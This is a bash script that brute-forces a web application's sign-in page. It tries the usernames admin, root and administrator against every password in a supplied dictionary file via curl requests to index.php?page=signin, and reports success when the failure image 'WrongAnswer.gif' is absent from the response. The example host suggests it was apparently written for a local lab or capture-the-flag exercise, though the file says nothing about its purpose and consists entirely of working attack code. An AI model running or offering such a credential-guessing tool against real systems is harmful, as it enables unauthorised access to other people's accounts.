#!/bin/bash
if [ $# -ne 2 ];then
   echo "Usage: ./script.sh <host> <input-file>"
   echo "Example: ./script.sh 192.168.99.100 dictionary"
   exit 1
fi


# Common user array
users=(admin root administrator)

for USERNAME in "${users[@]}"
do
    echo "==== TESTING USER : $USERNAME "
    while read PASSWORD; do
    curl -s "http://$1/index.php?page=signin&username=$USERNAME&password=$PASSWORD&Login=Login" | grep "WrongAnswer.gif" 1>/dev/null
    if [ $? -ne 0 ]; then
      echo "SUCCESS for: $USERNAME / $PASSWORD"
      exit 0
    fi
    echo "failed for: $USERNAME / $PASSWORD"
done < $2
done
